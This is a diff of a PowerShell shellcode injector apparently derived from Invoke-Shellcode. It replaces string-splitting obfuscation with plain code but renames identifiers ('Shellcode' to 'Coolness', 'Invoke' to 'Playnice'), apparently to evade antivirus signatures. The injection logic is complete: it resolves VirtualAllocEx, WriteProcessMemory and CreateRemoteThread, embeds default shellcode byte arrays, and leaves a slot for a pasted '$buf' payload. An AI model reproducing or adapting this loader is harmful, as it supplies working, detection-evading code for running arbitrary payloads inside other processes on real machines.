+        $WaitForSingleObject.Playnice($ThreadHandle, 0xFFFFFFFF) | Out-Null
+        $VirtualFree.Playnice($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
+        $VirtualFree.Playnice($BaseAddress, $Coolness.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
 
-        
-        ${w`AITF`o`RSinglEo`BJecT}."INv`o`kE"(${THRe`ADHan`d`Le}, 0xFFFFFFFF) | &("{1}{2}{0}" -f'l','Out-Nu','l')
-        
-        ${v`iRtuAl`FrEe}."I`Nvo`kE"(${caLLstu`BaD`dR`e`ss}, ${cALLs`T`UB}."LEng`TH" + 1, 0x8000) | &("{1}{0}"-f'll','Out-Nu') 
-        ${v`IrTu`ALFr`Ee}."i`NVO`KE"(${bAseA`dD`Re`SS}, ${sH`eLLco`De}."lE`NG`Th" + 1, 0x8000) | &("{2}{0}{1}" -f 'u','ll','Out-N') 
-
-        &("{1}{0}{3}{2}"-f'ite-Ve','Wr','e','rbos') ("{4}{0}{2}{3}{1}{5}"-f 'ec','plet','tion ','com','Shellcode inj','e!')
     }
-
-    
-    ${I`sWow6`4pR`oC`ESsA`ddr} = &("{2}{1}{0}{3}{4}" -f 'cAddr','o','Get-Pr','es','s') ("{3}{2}{0}{1}"-f '2.d','ll','3','kernel') ("{0}{2}{3}{1}" -f'IsWow','ss','64Proc','e')
-
-    ${ADd`REs`S`WidtH} = ${NU`ll}
-
+    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
+    $AddressWidth = $null
     try {
-        ${A`dDr`E`SSwidTH} = @(&("{0}{1}{2}"-f 'Get-Wm','iOb','ject') -Query ("{9}{0}{1}{7}{8}{3}{2}{10}{5}{6}{4}" -f 'T ','AddressW','h ','t','r','ro','cesso','i','d','SELEC','FROM Win32_P'))[0] | &("{1}{2}{3}{0}" -f 't','Select','-Obje','c') -ExpandProperty ("{1}{0}{2}{3}"-f 'd','A','dressWid','th')
+        $AddressWidth = @(Get-WmiObject -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth
     } catch {
-        throw ("{6}{5}{9}{0}{2}{8}{4}{3}{1}{7}"-f'sso','s width','r','res','dd','ble to de','Una','.',' a','termine OS proce')
+        throw 'Unable to determine OS processor address width.'
     }
-
-    switch (${addrESsw`I`dTh}) {
+    switch ($AddressWidth) {
         '32' {
-            ${6`4BItOS} = ${Fa`LsE}
+            $64bitOS = $False
         }
-
         '64' {
-            ${64`BIt`os} = ${TR`UE}
-
-            ${IsW`O`W64prO`c`e`Ssd`EleGATE} = &("{0}{3}{2}{1}{4}"-f'Get-De','p','y','legateT','e') @([IntPtr],   ( lS  ('VArIA'+'BLe:VI'+'B') ).vaLue.("{2}{1}{0}{3}"-f 'ByR','ke','Ma','efType').Invoke()) ([Bool])
-    	    ${i`s`wo`w6`4PRoCEss} =  ( geT-VARiaBle  ('w'+'ytd8')  -VA)::("{0}{5}{3}{7}{8}{6}{4}{1}{2}" -f 'GetD','tionPointe','r','eg','nc','el','u','ateFor','F').Invoke(${iSWOw6`4`pR`ocEs`s`Addr}, ${ISW`oW64p`ROceSs`dELe`GATE})
+            $64bitOS = $True
+            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
+    	    $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
         }
-
-        ("{0}{1}{2}" -f 'de','faul','t') {
-            throw ("{2}{4}{6}{1}{3}{5}{0}" -f'tected.','t','Invalid OS ad','h d','dress','e',' wid')
+        default {
+            throw 'Invalid OS address width detected.'
         }
     }
-
-    if (  $dhv63k::"Si`Ze" -eq 4)
+    if ([IntPtr]::Size -eq 4)
     {
-        ${PO`w`e`RsH`eLL32biT} = ${t`Rue}
+        $PowerShell32bit = $true
     }
     else
     {
-        ${P`o`we`RsHeLl32b`IT} = ${FaL`SE}
+        $PowerShell32bit = $false
     }
-
-    if (${PsbOu`NdpA`RaM`eteRs}[("{1}{2}{0}{3}" -f 'lco','S','hel','de')])
+    if ($PSBoundParameters['Coolness'])
     {
-        
-        
-        [Byte[]] ${S`HeLLC`ODE`32} = ${SHe`Ll`CoDe}
-        [Byte[]] ${SHe`L`LCODE64} = ${she`LL`cOde32}
+        [Byte[]] $Coolness32 = $Coolness
+        [Byte[]] $Coolness64 = $Coolness32
     }
     else
     {
-        
-        
-        
-        
-        
-        [Byte[]] ${s`HE`L`lcodE32} = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
+        [Byte[]] $Coolness32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                   0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                   0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                   0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
@@ -378,10 +277,7 @@
                                   0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                   0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                   0x61,0x6c,0x63,0x00)
-
-        
-        
-        [Byte[]] ${S`H`elLc`oDE64} = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
+        [Byte[]] $Coolness64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                   0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                   0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                   0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
@@ -399,62 +295,53 @@
                                   0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                                   0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)
     }
-
-    if ( ${p`SboU`Ndp`AR`AMETers}[("{0}{2}{1}" -f 'Proc','ssID','e')] )
+    if ( $PSBoundParameters['ProcessID'] )
     {
-        
-        ${O`Penp`Roces`saDdR} = &("{0}{1}{2}{3}{4}" -f'G','et','-','ProcAddres','s') ("{0}{2}{3}{1}"-f 'kernel','dll','3','2.') ("{2}{3}{0}{1}" -f 's','s','Op','enProce')
-        ${Ope`N`P`RO`CE`ssDeLEgatE} = &("{3}{4}{1}{0}{2}" -f'e','-D','legateType','G','et') @([UInt32], [Bool], [UInt32]) ([IntPtr])
-        ${opE`NProCE`ss} =  $WYtd8::("{3}{0}{5}{2}{4}{1}" -f'tDele','inter','F','Ge','unctionPo','gateFor').Invoke(${op`EnprOCeSS`A`d`Dr}, ${opEn`PRO`C`es`sdelegatE})
-        ${VirT`UaLalLo`CE`xa`D`Dr} = &("{2}{1}{0}" -f'ss','et-ProcAddre','G') ("{1}{0}{2}"-f'r','ke','nel32.dll') ("{0}{3}{1}{2}" -f 'V','tualA','llocEx','ir')
-        ${virtu`A`lALL`o`c`ExdELeGAte} = &("{1}{0}{4}{3}{2}"-f 'e','G','Type','e','t-Delegat') @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
-        ${VIR`TUALA`LLo`cex} =  $WYtD8::("{8}{6}{2}{3}{1}{4}{0}{7}{5}"-f'onPo','rFunc','el','egateFo','ti','er','tD','int','Ge').Invoke(${v`IRTuaLal`lOc`EXAD`Dr}, ${V`iRtUAL`AlLoc`exdELE`GA`TE})
-        ${W`RitePrO`CE`sS`mEmoRy`AdDR} = &("{1}{2}{0}{3}"-f'cAddres','Get-Pr','o','s') ("{2}{0}{3}{1}"-f 'el','l','kern','32.dl') ("{3}{0}{1}{4}{2}{5}" -f 'ritePr','ocess','em','W','M','ory')
-        ${wr`iTEP`R`OCessmE`mOry`DeLEgATe} = &("{1}{2}{4}{3}{0}" -f 'e','Get','-De','egateTyp','l') @([IntPtr], [IntPtr], [Byte[]], [UInt32],   ( cHildItEm ('vARiablE:'+'Ha'+'FU'+'dw')  ).VAluE.("{0}{2}{3}{1}" -f 'Mak','e','eByRefT','yp').Invoke()) ([Bool])
-        ${wri`TE`PRocESSMEM`O`Ry} =  (  CHiLDItEM  VarIAblE:wYTd8).VALUE::("{3}{0}{6}{1}{5}{2}{4}"-f 'et','e','ForFunctionPoi','G','nter','legate','D').Invoke(${W`RI`Te`prOceSSm`EMo`R`Yad`dr}, ${w`RITEp`R`oC`EssmemO`R`y`dELEgAte})
-        ${CRea`Te`REM`OTEth`ReAdad`dr} = &("{1}{2}{3}{0}{4}" -f'es','Get','-Pro','cAddr','s') ("{1}{0}{2}{3}" -f'ernel3','k','2','.dll') ("{3}{1}{2}{0}" -f 'hread','e','moteT','CreateR')
-        ${creA`TE`ReMo`T`EThreAddELeGA`Te} = &("{1}{2}{3}{0}{4}"-f'-DelegateTy','G','e','t','pe') @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
-        ${cReATeReMot`eT`hR`eAd} =  (  dIr ("vaR"+"iAbLE:"+"wy"+"t"+"d8")  ).VAlUE::("{5}{1}{4}{0}{3}{2}" -f 't','tDelegateFor','Pointer','ion','Func','Ge').Invoke(${CrEATEre`MoteT`HREaDA`Ddr}, ${cReatEReMOTe`T`hReadDe`lE`gA`Te})
-        ${cLo`SEHaN`D`leAD`dr} = &("{1}{0}{2}{3}{4}"-f'roc','Get-P','Add','res','s') ("{1}{2}{3}{0}"-f'32.dll','k','ern','el') ("{2}{1}{0}"-f'e','loseHandl','C')
-        ${cLOseHANdLE`D`eL`EGate} = &("{1}{2}{0}" -f 'teType','Get-Del','ega') @([IntPtr]) ([Bool])
-        ${clO`S`EhandLE} =   $WYtD8::("{0}{2}{1}{4}{3}"-f 'GetDelegateFo','unct','rF','Pointer','ion').Invoke(${C`lO`SEha`NDL`eAdDR}, ${c`LoSehaN`DLe`DELe`GA`TE})
-    
-        &("{0}{1}{2}{3}"-f 'Wri','te','-Ver','bose') ('I'+'njecti'+'ng '+'s'+'hellc'+'ode '+'int'+'o '+'P'+'ID: '+"$ProcessId")
-        
-        if ( ${F`oR`ce} -or ${PSC`Md`lET}.("{2}{0}{4}{1}{3}"-f 'dCon','in','Shoul','ue','t').Invoke( ("{7}{0}{8}{12}{10}{1}{3}{4}{5}{9}{2}{11}{6}"-f 'o you','ry ','an','o','u','t your ','?','D',' w','evil pl','r','s','ish to ca'),
-                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)! " ) )
+        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
+        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
+        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
+        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
+        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
+        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
+        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
+        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
+        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
+        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
+        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
+        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
+        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
+
+        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
+                 "Neating Coolness Neating into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
         {
-            &("{4}{3}{2}{0}{1}"-f 'o','de','llc','he','Inject-RemoteS') ${prO`C`EsSiD}
+            Neat-RemoteCoolness $ProcessId
         }
     }
     else
     {
+        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
+        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
+        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
+        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
+        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
+        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
+        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
+        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
+        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
+        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
+        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
+
+        Neat-LocalCoolness
         
-        ${VIrT`UALALLOC`AD`DR} = &("{4}{1}{0}{3}{2}" -f 'cAddre','Pro','s','s','Get-') ("{1}{2}{0}"-f'2.dll','kernel','3') ("{0}{3}{1}{2}"-f 'Virt','lo','c','ualAl')
-        ${Virt`UaLa`L`loC`d`e`lEGaTe} = &("{2}{4}{1}{0}{3}"-f 't','a','Get-Dele','eType','g') @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
-        ${V`iRT`U`AlaLloc} =  (  Item  ('vArIaB'+'Le:W'+'Yt'+'d'+'8')  ).ValuE::("{1}{3}{5}{4}{2}{0}" -f'inter','Get','tionPo','De','ForFunc','legate').Invoke(${V`I`RtuAlA`llOcaddR}, ${v`IRtualA`llOC`dElEGaTe})
-        ${v`I`RtuA`Lfr`E`EADdR} = &("{0}{3}{2}{1}" -f 'Get','ddress','cA','-Pro') ("{2}{0}{3}{1}" -f 'nel32','dll','ker','.') ("{1}{2}{0}" -f'ee','Virtua','lFr')
-        ${vIrTua`lf`R`EedelEgaTe} = &("{4}{5}{0}{3}{1}{2}" -f 'el','teT','ype','ega','Get','-D') @([IntPtr], [Uint32], [UInt32]) ([Bool])
-        ${vIr`T`UaLfREE} =   $WytD8::("{1}{2}{5}{0}{4}{3}{6}"-f 'teFo','Ge','tD','ctio','rFun','elega','nPointer').Invoke(${vIr`T`UALF`Re`EADDR}, ${viR`Tu`AlFr`ee`DELe`gA`TE})
-        ${CR`EAtET`h`R`e`ADaddr} = &("{1}{0}{3}{4}{2}"-f't-','Ge','ddress','Proc','A') ("{1}{0}{3}{2}"-f'd','kernel32.','l','l') ("{0}{2}{1}" -f'Cr','read','eateTh')
-        ${cR`EatE`THR`eA`dDE`lEGaTE} = &("{4}{2}{0}{3}{1}"-f 't','ype','Delega','eT','Get-') @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
-        ${CREaT`eThrE`Ad} =  (  VariABLe wytd8).vALUE::("{6}{1}{8}{2}{4}{0}{5}{3}{7}"-f 'on','tDelegateFo','unct','nt','i','Poi','Ge','er','rF').Invoke(${CreA`T`eTHRe`ADA`DdR}, ${c`ReATeTHr`e`A`dDeLEga`Te})
-        ${WaitfoR`S`iNGlEObJecT`Ad`dR} = &("{4}{1}{2}{0}{3}"-f'dres','t-Proc','Ad','s','Ge') ("{1}{2}{3}{0}"-f 'l','kern','el3','2.dl') ("{4}{0}{1}{2}{3}" -f'tF','orSin','gle','Object','Wai')
-        ${WA`IT`F`OrSing`LeoBJEctDelE`ga`Te} = &("{1}{2}{3}{4}{0}"-f'teType','Ge','t-','Dele','ga') @([IntPtr], [Int32]) ([Int])
-        ${wA`iTF`oR`sIngleobj`eCt} =  ( VaRIable  wyTd8  ).vALuE::("{8}{3}{4}{0}{5}{1}{7}{6}{2}"-f'gateF','rFun','inter','tDe','le','o','tionPo','c','Ge').Invoke(${wa`itfoRsinG`l`eoBj`eCTa`DDR}, ${W`A`IT`F`orsing`leoBJ`ECtDEL`EGaTe})
-        
-        &("{1}{0}{2}" -f'te-Ve','Wri','rbose') ("{1}{8}{5}{4}{2}{3}{7}{0}{9}{6}" -f 'nto ','I','g',' shellcode','ectin','j','owerShell',' i','n','P')
-        
-        if ( ${fO`RcE} -or ${PsCmD`LET}.("{2}{0}{1}{3}"-f'houldCon','tinu','S','e').Invoke( ("{6}{9}{3}{0}{4}{10}{11}{8}{2}{5}{7}{1}" -f ' c','lans?','l','o','arry ',' ','Do you wis','p',' evi','h t','out ','your'),
-                 ("{5}{3}{7}{4}{2}{1}{8}{0}{6}{10}{9}"-f 'rSh','ow',' running P','sh','he','Injecting ','el','ellcode into t','e','ess!','l proc') ) )
-        {
-            &("{2}{1}{0}{4}{3}" -f'She','nject-Local','I','lcode','l')
-        }
     }   
 }
 
+
 #Paste code below this line
-$$$SCODE$$$
+#$$$SCODE$$$
 #Don't modify below this line
 
-&("{1}{4}{0}{3}{2}"-f 'voke-She','I','e','llcod','n') -Shellcode $buf -Force
+Playnice-Coolness -Coolness $buf -Forces
